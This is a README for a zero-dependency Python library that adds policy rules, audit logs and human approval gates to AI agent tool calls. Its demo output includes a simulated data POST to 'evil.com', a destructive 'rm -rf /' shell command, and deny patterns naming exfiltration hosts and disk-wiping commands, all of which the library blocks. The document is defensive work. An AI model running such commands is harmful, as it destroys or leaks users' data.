# agent-governance

[![CI](https://github.com/balajeeasish/agent-governance/actions/workflows/ci.yml/badge.svg)](https://github.com/balajeeasish/agent-governance/actions/workflows/ci.yml)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

**Policy checks, audit logging, and human review gates for AI agents - in pure Python, zero dependencies.**

## Why it matters

An AI agent that can run shell commands, write files, and call external APIs is powerful and dangerous in equal measure. Before you give an agent real tools, you need three things: a way to say what is allowed, a record of everything it tried, and a human in the loop for the risky calls. This library gives you all three in a few hundred lines of readable Python, with no third-party packages to audit.

## Quickstart

Runs in under a minute. Python 3.10 or newer, no dependencies to install.

```bash
git clone https://github.com/balajeeasish/agent-governance.git
cd agent-governance
python examples/demo.py
```

Run the test suite:

```bash
python -m pytest -q
```

## Example output

`python examples/demo.py` simulates an agent attempting four tool calls against the sample policy in `policies/default.yaml`:

```
agent-governance demo: policy engine + audit log + approval gate

[1] tool=read_file
    args={'path': 'notes.txt'}
    decision: ALLOW (rule: allow-reads)
    reason: Allowed by rule 'allow-reads'
    outcome: executed (simulated)

[2] tool=write_file
    args={'path': '/etc/app.conf', 'content': 'debug=true'}
    decision: REQUIRE_APPROVAL (rule: approve-all-writes)
    reason: Rule 'approve-all-writes' requires human approval for tool 'write_file'
    approval: DECLINED (auto-declined in demo)
    outcome: blocked - approval declined

[3] tool=http_request
    args={'url': 'https://evil.com/collect', 'method': 'POST'}
    decision: DENY (rule: block-exfiltration)
    reason: Denied by rule 'block-exfiltration': args matched pattern 'evil\.com|pastebin'
    outcome: blocked

[4] tool=shell
    args={'command': 'rm -rf /'}
    decision: DENY (rule: no-shell-destruct)
    reason: Denied by rule 'no-shell-destruct': args matched pattern 'rm -rf|mkfs|: \(\)'
    outcome: blocked

Audit log tail (audit-demo.jsonl):
  {"ts": "2026-09-30T17:19:34.234397+00:00", "tool": "read_file", "args_redacted": {"path": "notes.txt"}, "decision": "allow", "rule": "allow-reads"}
  {"ts": "2026-09-30T17:19:34.234561+00:00", "tool": "write_file", "args_redacted": {"path": "/etc/app.conf", "content": "debug=true"}, "decision": "require_approval", "rule": "approve-all-writes"}
  {"ts": "2026-09-30T17:19:34.234663+00:00", "tool": "http_request", "args_redacted": {"url": "https://evil.com/collect", "method": "POST"}, "decision": "deny", "rule": "block-exfiltration"}
  {"ts": "2026-09-30T17:19:34.234704+00:00", "tool": "shell", "args_redacted": {"command": "rm -rf /"}, "decision": "deny", "rule": "no-shell-destruct"}
```

## Architecture

Three small components, each usable on its own:

- **PolicyEngine** (`src/agent_governance/policy.py`) - loads YAML policies and evaluates tool calls. The first matching rule wins; anything unmatched is allowed by default. Rules match on tool name and optional regex over the arguments. Ships with a minimal YAML subset parser, so there is no PyYAML dependency.
- **AuditLogger** (`src/agent_governance/audit.py`) - append-only JSONL log. Every entry carries `ts`, `tool`, `args_redacted`, `decision`, and `rule`. Secrets (API keys, tokens, bearer credentials) are masked before they are written.
- **ApprovalGate** (`src/agent_governance/gate.py`) - routes `require_approval` decisions to a human. `CLIApprover` prompts on stdin; `CallbackApprover` wraps any function, which makes it easy to plug in Slack, email, or a ticketing queue.

Typical integration:

```python
from agent_governance import PolicyEngine, AuditLogger, ApprovalGate, CLIApprover

engine = PolicyEngine.from_yaml_file("policies/default.yaml")
logger = AuditLogger("audit.jsonl")
gate = ApprovalGate(CLIApprover())

decision = engine.evaluate("shell", {"command": user_command})
logger.log("shell", {"command": user_command}, decision)
if decision.action == "deny" or not gate.request("shell", {"command": user_command}, decision):
    raise RuntimeError(f"Blocked by policy: {decision.reason}")
# ... execute the tool call ...
```

## Writing your own policy

Policies live in YAML files under `policies/`. Each rule has a name, an action (`allow`, `deny`, or `require_approval`), and a `when` clause:

```yaml
rules:
  - name: no-prod-deletes
    action: deny
    when: {tool: "shell", args_match: "DROP TABLE|DELETE FROM"}
  - name: approve-external-calls
    action: require_approval
    when: {tool: "http_request"}
```

Rules are evaluated top to bottom and the first match wins, so put specific deny rules before broad allow rules.

## Roadmap

- Policy simulation mode: dry-run a policy against a recorded audit log to see what would have been blocked
- Signed audit logs for tamper evidence
- Rate limiting and budget caps per tool
- Async approver integrations (Slack, webhooks)

## Contributing

Issues and pull requests are welcome. Please keep the standard library only constraint: the runtime package must have zero third-party dependencies. Run `python -m pytest -q` before submitting.

## License

MIT. See [LICENSE](LICENSE) for details.
